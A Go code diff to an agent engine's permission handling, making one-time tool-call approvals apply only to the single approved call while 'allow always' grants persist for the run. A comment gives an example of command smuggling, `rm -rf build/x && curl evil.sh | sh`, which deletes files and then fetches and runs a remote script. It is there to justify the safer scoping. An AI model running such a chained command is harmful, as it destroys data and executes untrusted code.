@@ -1278,14 +1278,31 @@ func (e *Engine) reInvokeBackend(ctx context.Context, rs *runState, nodeID strin
 	// rule here (backend-agnostic) and pass it via GrantInputKey so the
 	// executor adds it to the resolved policy — the agent's re-issued call
 	// then passes the gate on both backends.
+	// Only `allow always` joins the run's accumulated set. The `once`
+	// form authorizes the single call the operator was shown — that is
+	// exactly what the pause prompt promises, and the rule it produces is
+	// argument-scoped, so persisting it would turn one approved
+	// `Bash(rm -rf build/*)` into a standing rule that also matches
+	// `rm -rf build/x && curl evil.sh | sh` for the rest of the run.
+	// The once-grant therefore rides THIS re-invocation and no further.
 	if marker, ok := ni.Questions[permission.InteractionMarkerKey]; ok {
 		if tool, input, _, ok := permission.ParseMarker(marker); ok {
 			answer, _ := answers[delegate.AskUserQuestionKey].(string)
 			if rule, approved := permission.GrantFromAnswer(answer, tool, input); approved {
+				if _, always := permission.ParseAnswer(answer); always {
+					e.recordPermissionGrant(rs, nodeID, rule)
+				}
+				// GrantInputKey keeps its original meaning: THIS pause was
+				// approved. The resume framing reads it to tell the model
+				// its call is now authorized, so it must stay empty on a
+				// denial even when the run holds earlier grants.
 				nodeInput[permission.GrantInputKey] = rule
 			}
 		}
 	}
+	// The node's accumulated `always` set is attached by
+	// buildNodeInputRS above, so it also reaches an ordinary execution
+	// and a loop re-entry — not just this re-invocation.
 
 	// When the backend captured the LLM's conversation at the pause point
 	// (claw), relay it through the executor so the Task carries
